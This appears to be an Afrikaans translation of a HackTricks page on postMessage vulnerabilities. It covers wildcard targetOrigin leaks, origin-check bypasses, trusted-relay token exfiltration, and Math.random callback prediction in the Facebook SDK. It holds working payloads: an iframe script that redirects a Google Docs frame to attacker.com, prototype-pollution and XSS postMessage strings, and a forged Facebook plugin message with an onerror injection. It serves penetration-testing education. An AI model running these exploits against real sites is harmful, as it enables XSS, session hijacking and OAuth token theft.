# PostMessage Kwetsbaarhede

{{#include ../../banners/hacktricks-training.md}}

## Stuur **PostMessage**

**PostMessage** gebruik die volgende funksie om 'n boodskap te stuur:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
In the **second scenario**, the **message can only be sent to that domain** (even if the origin of the Window object is different).\
If the **wildcard** is used, **messages could be sent to any domain**, and will be sent to the origin of the Window object.

### Aanval op iframe & wildcard in **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message via **postMessage** using a **wildcard** (\*), you can **modify** the **origin** of the **iframe** and **leak** the **sensitive** message to a domain controlled by you.\
Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener eksploitasie

**`addEventListener`** is die funksie wat deur JS gebruik word om die funksie te verklaar wat **`postMessages` verwag**.\
Kode soortgelyk aan die volgende sal gebruik word:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Let op in hierdie geval hoe die **eerste ding** wat die kode doen is om die origin te kontroleer. Dit is uiters **belangrik**, veral as die bladsy enige **sensitiewe aksie** met die ontvangde inligting gaan uitvoer (soos om 'n wagwoord te verander). **As dit nie die origin kontroleer nie, kan aanvallers slagoffers laat arbitraire data na hierdie endpoints stuur** en die slagoffers se wagwoorde verander (in hierdie voorbeeld).

### Enumeration

Om event listeners op die huidige bladsy te vind kan jy:

- **Soek** die JS-kode na `window.addEventListener` en `$(window).on` (_JQuery-weergawe_)
- **Voer uit** in die ontwikkelaarhulpmiddels-konsol: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Gaan na** _Elements --> Event Listeners_ in die ontwikkelaarhulpmiddels van die blaaier

![](<../../images/image (396).png>)

- Gebruik 'n **browser extension** soos [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) of [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Hierdie browser extensions sal **alle messages onderskep** en dit vir jou wys.

### Origin check bypasses

- Die `event.isTrusted` attribuut word as veilig beskou aangesien dit net `True` teruggee vir events wat deur regte gebruikeraksies gegenereer is. Alhoewel dit moeilik is om te omseil as dit korrek geïmplementeer is, is die betekenis daarvan in sekuriteitskontroles beduidend.
- Die gebruik van `indexOf()` vir origin-validasie in PostMessage-events kan vatbaar wees vir omseiling. 'n Voorbeeld wat hierdie kwesbaarheid illustreer is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Die **`search()`** metode van `String.prototype.search()` is bedoel vir regular expressions, nie vir string-vergelykings nie. As iets anders as 'n regexp gespas word word dit implisiet na 'n regex gekonverteer, wat die metode potensieel onveilig maak. Dit is omdat in regex 'n punt (.) as 'n wildcard optree, wat die validering kan omseil met spesiaal saamgestelde domeine. Byvoorbeeld:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Die **`match()`** funksie, soortgelyk aan `search()`, verwerk regex. As die regex verkeerd gestruktureer is, kan dit vatbaar wees vir omseiling.
- Die **`escapeHtml`** funksie is bedoel om insette te sanitiseer deur karakters te ontsnap. Dit skep egter nie 'n nuwe ontsnapte objek nie maar oorskryf die eienskappe van die bestaande objek. Hierdie gedrag kan uitgebuit word. Veral as 'n objek so gemanipuleer kan word dat 'n gekontroleerde eienskap nie `hasOwnProperty` erken nie, sal die `escapeHtml` nie soos verwag werk nie. Dit word in die voorbeelde hieronder gedemonstreer:

- Verwagtelike mislukking:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Omseiling van die ontsnapping:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In die konteks van hierdie kwesbaarheid is die `File` objek besonders uitbuitbaar as gevolg van sy lees-alleen `name` eienskap. Hierdie eienskap, wanneer in templates gebruik, word nie deur die `escapeHtml` funksie gesanitiseer nie, wat tot potensiële sekuriteitsrisiko's lei.

- Die `document.domain` eienskap in JavaScript kan deur 'n skrip gestel word om die domein te verkort, wat 'n meer losser same-origin beleidstoepassing binne dieselfde hoofdomein moontlik maak.

### Origin-only trust + trusted relays

As 'n ontvanger slegs `event.origin` kontroleer (bv. vertrou enige `*.trusted.com`) kan jy dikwels 'n **"relay"** bladsy op daardie origin vind wat aanvaller-beheerde params via `postMessage` terugkaats na 'n gegewe `targetOrigin`/`targetWindow`. Voorbeelde sluit in bemarkings/analytics gadgets wat query params neem en `{msg_type, access_token, ...}` na `opener`/`parent` stuur. Jy kan:

- **Maak die slagoffer-bladsy oop** in 'n popup/iframe wat 'n `opener` het sodat sy handlers registreer (baie pixels/SDKs heg net listeners aan wanneer `window.opener` bestaan).
- **Navigeer 'n ander aanvaller-venster** na die relay endpoint op die vertroude origin en vul die message-velde wat jy ingeplant wil hê (message type, tokens, nonces).
- Omdat die boodskap nou **van die vertroude origin** kom, slaag origin-only validering en kan jy bevoegde gedrag (staatveranderinge, API-oproepe, DOM-skryfsels) in die slagoffer se listener aktiveer.

Misbruikspatrone wat in die natuur gesien is:

- Analytics SDKs (bv. pixel/fbevents-styl) verbruik messages soos `FACEBOOK_IWL_BOOTSTRAP`, en **roep dan backend APIs aan met 'n token wat in die boodskap voorsien is** en sluit **`location.href` / `document.referrer`** in die versoekliggaam in. As jy jou eie token voorsien, kan jy **hierdie versoeke in die token se versoekgeskiedenis/logs lees** en OAuth-kodes/tokens wat in die URL/referrer van die slagoffer-bladsy voorkom, eksfiltreer.
- Enige relay wat arbitraire velde in `postMessage` reflekteer laat jou toe om **message types te spoofa** wat deur bevoegde listeners verwag word. Kombineer dit met swak insetvalidering om Graph/REST-oproepe, funksie-ontsluitings, of CSRF-ekwivalente vloei te bereik.

Soekwenke: enumereer `postMessage` listeners wat slegs `event.origin` kontroleer, en kyk dan vir **same-origin HTML/JS endpoints wat URL-params via `postMessage` deurstuur** (bemarkingsvoorskoue, login popups, OAuth-foutbladsye). Stik beide saam met `window.open()` + `postMessage` om origin-kontroles te omseil.

### e.origin == window.origin bypass

Wanneer 'n webbladsy ingesluit word binne 'n **sandboxed iframe** met behulp van %%%%%%, is dit belangrik om te verstaan dat die iframe se origin op null gestel sal word. Dit is veral relevant wanneer daar met **sandbox attributes** en hul implikasies op sekuriteit en funksionaliteit gewerk word.

Deur **`allow-popups`** in die sandbox-attribuut te spesifiseer, erflik enige popup-venster wat vanuit die iframe oopgemaak word die sandbox-beperkings van sy ouer. Dit beteken dat tensy die **`allow-popups-to-escape-sandbox`** attribuut ook ingesluit is, die popup-venster se origin soortgelyk op `null` gestel sal word, in lyn met die iframe se origin.

Gevolglik, wanneer 'n popup onder hierdie toestande oopgemaak word en 'n boodskap vanaf die iframe na die popup gestuur word met `postMessage`, het beide die stuurende en ontvangende kante hul origins op `null` gestel. Hierdie situasie lei tot 'n geval waar **`e.origin == window.origin`** na `true` evalueer (`null == null`), omdat beide die iframe en die popup dieselfde origin-waarde van `null` deel.

Vir meer inligting **lees**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Dit is moontlik om na te gaan of die boodskap vanaf dieselfde venster gekom het waarin die skrip luister (veral interessant vir Content Scripts van browser extensions om te kontroleer of die boodskap vanaf dieselfde bladsy gestuur is):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Jy kan die **`e.source`** van 'n boodskap op null dwing deur 'n **iframe** te skep wat die **postMessage** stuur en onmiddellik verwyder word.

Vir meer inligting **lees:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Om hierdie aanvalle uit te voer, behoort jy idealiter die **slagoffer se webblad** binne 'n `iframe` te plaas. Maar sommige headers soos `X-Frame-Header` kan daardie **gedrag** **voorkom**.\
In daardie gevalle kan jy steeds 'n minder subtiele aanval gebruik. Jy kan 'n nuwe oortjie na die kwesbare webtoepassing oopmaak en daarmee kommunikeer:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Steel boodskap wat aan die child iframe gestuur is deur die **main** bladsy te blokkeer

Op die volgende bladsy kan jy sien hoe jy **sensitiewe postmessage data** wat aan 'n **child iframe** gestuur word, kan steel deur die **main** bladsy te blokkeer voordat die data gestuur word en 'n **XSS in die child** te misbruik om die data te **leak** voordat dit ontvang word:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Steel boodskap deur die iframe se location te verander

As jy 'n webblad in 'n iframe kan laai sonder 'n X-Frame-Header wat 'n ander iframe bevat, kan jy **die location van daardie child iframe verander**, sodat as dit 'n **postmessage** ontvang wat met 'n **wildcard** gestuur is, 'n aanvaller daardie iframe se **origin** na 'n bladsy wat deur hom beheer word kan **verander** en die boodskap kan **steel**:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage na Prototype Pollution en/of XSS

In scenario's waar die data wat deur `postMessage` gestuur word deur JS uitgevoer word, kan jy die **page** in 'n **iframe** laai en die **prototype pollution/XSS** misbruik deur die exploit via `postMessage` te stuur.

'n Paar **baie goed verduidelikte XSS deur `postMessage`** kan gevind word by [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Voorbeeld van 'n exploit om **Prototype Pollution en daarna XSS** te misbruik deur 'n `postMessage` aan 'n `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Vir **meer inligting**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Voorspel **`Math.random()`** callback tokens in postMessage bridges

Wanneer boodskapvalidasie 'n 'shared secret' gebruik wat met `Math.random()` gegenereer is (bv. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) en dieselfde helper ook plugin iframes benoem, kan jy PRNG-uitsette terugkry en vervalste vertroude boodskappe genereer:

- **Leak PRNG outputs via `window.name`:** Die SDK benoem plugin iframes outomaties met `guid()`. As jy die top frame beheer, iframe die victim page, navigeer dan die plugin iframe na jou origin (bv. `window.frames[0].frames[0].location='https://attacker.com'`) en lees `window.frames[0].frames[0].name` om 'n rou `Math.random()`-uitset te verkry.
- **Force more outputs without reloads:** Sommige SDKs bied 'n reinit-pad; in die FB SDK veroorsaak die stuur van `init:post` met `{xfbml:1}` dat `XFBML.parse()` aangeroep word, die plugin iframe vernietig/herstel word, en nuwe name/callback-ID's gegenereer word. Herhaalde reinit produseer soveel PRNG-uitsette as nodig (let op ekstra interne `Math.random()`-aanroepe vir callback/iframe-ID's, dus moet oplosers tussentydse waardes oorskiet).
- **Trusted-origin delivery via parameter pollution:** As 'n first-party plugin-endpoint 'n ongefiltreerde parameter in die cross-window payload weerspieël (bv. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), kan jy `&type=...&iconSVG=...` injekteer terwyl die vertroude `facebook.com` origin behou bly.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` en voer verskeie waardes (selfs nie-aaneenlopende) in 'n V8 `Math.random`-voorspeller (bv. Z3-gebaseerd). Genereer die volgende `guid()` lokaal om die verwagte callback-token te vervals.
- **Trigger the sink:** Stel die postMessage-data so op dat die bridge `xd.mpn.setupIconIframe` dispatch en HTML in `iconSVG` injekteer (bv. URL-geënkodeerde `<img src=x onerror=...>`), wat DOM XSS binne die hosting origin bewerkstellig; van daar kan same-origin iframes (OAuth dialogs, arbiters, ens.) gelees word.
- **Framing quirks help:** Die ketting vereis framing. In sommige mobile webviews kan `X-Frame-Options` terugval na die onsupported `ALLOW-FROM` wanneer `frame-ancestors` teenwoordig is, en “compat” parameters kan permissiewe `frame-ancestors` afdwing, wat die `window.name` side channel moontlik maak.

#### Minimale vervalste boodskapvoorbeeld
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Verwysings

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Om te oefen: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
